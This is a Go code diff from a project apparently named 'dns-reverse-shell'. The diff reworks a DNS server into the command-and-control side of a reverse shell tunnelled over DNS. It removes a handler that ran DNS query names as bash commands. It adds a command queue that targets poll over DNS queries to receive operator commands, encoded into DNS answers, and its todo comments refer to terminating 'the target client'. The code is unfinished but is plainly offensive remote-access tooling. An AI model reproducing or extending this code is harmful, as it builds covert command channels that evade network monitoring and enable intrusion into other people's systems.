@@ -3,8 +3,8 @@ package protocol
 import (
 	"dns-reverse-shell/main/encoder"
 	"fmt"
+	"github.com/golang-collections/collections/queue"
 	"github.com/miekg/dns"
-	"os/exec"
 )
 
 type dnsHandler struct {
@@ -20,12 +20,13 @@ type DNSServer struct {
 	encoder         encoder.StringEncoder
 	handler         *dnsHandler
 	messageSplitter MessageSplitter
+	idleTimeout     int
+	queue           queue.Queue
 }
 
-func NewDnsServer(port string, encoder encoder.StringEncoder) *DNSServer {
-	d := &DNSServer{port: port, encoder: encoder}
+func NewDnsServer(port string, encoder encoder.StringEncoder, idleTimeout int) *DNSServer {
+	d := &DNSServer{port: port, encoder: encoder, idleTimeout: idleTimeout, messageSplitter: NewSimpleMessageSplitter(), queue: *queue.New()}
 	d.handler = newDnsHandler(d)
-	d.messageSplitter = NewSimpleMessageSplitter()
 	return d
 }
 
@@ -49,20 +50,37 @@ func (s DNSServer) createServer() *dns.Server {
 	return server
 }
 
-func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
+func (s DNSServer) QueueCommand(command string) {
+	//todo: handle empty command
+	//todo: handle close command -> terminate the target client
+	s.queue.Enqueue(command)
+}
+
+func (s DNSServer) handlePolling() string {
+	if s.queue.Len() != 0 {
+		return s.queue.Dequeue().(string)
+	}
+	return "idle"
+}
+
+func (s DNSServer) buildAnswer(command string) []dns.RR {
+	encoded := s.encoder.Encode(command)
+	split := s.messageSplitter.Split(encoded)
+	var answer []dns.RR
+	for i := range split {
+		answer = append(answer, split[i])
+	}
+	return answer
+}
+
+func (s DNSServer) createAnswerMessage(r *dns.Msg) *dns.Msg {
 	msg := new(dns.Msg)
 	msg.SetReply(r)
 	msg.Authoritative = true
+	return msg
+}
 
-	for _, question := range r.Question {
-		command := h.server.encoder.Decode(question.Name)
-		output := executeCommand(command)
-		encoded := h.server.encoder.Encode(output)
-		splitMessage := h.server.messageSplitter.Split(encoded)
-		for i := range splitMessage {
-			msg.Answer = append(msg.Answer, splitMessage[i])
-		}
-	}
+func (s DNSServer) writeMessage(w dns.ResponseWriter, msg *dns.Msg) {
 	err := w.WriteMsg(msg)
 	if err != nil {
 		fmt.Println(err)
@@ -70,12 +88,18 @@ func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
 	}
 }
 
-func executeCommand(command string) string {
-	cmd := exec.Command("bash", "-c", command)
-	output, err := cmd.CombinedOutput()
-	if err != nil {
-		fmt.Println(err)
-		return "command execution failed: " + err.Error()
+func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
+	msg := h.server.createAnswerMessage(r)
+	for _, question := range r.Question {
+		var command string
+		if question.Name == "poll" {
+			command = h.server.handlePolling()
+		} else {
+			//handle answer -> print
+			command = "ok"
+			//answer ok -> resend on client side if not ok or error?
+		}
+		msg.Answer = h.server.buildAnswer(command)
 	}
-	return string(output)
+	h.server.writeMessage(w, msg)
 }
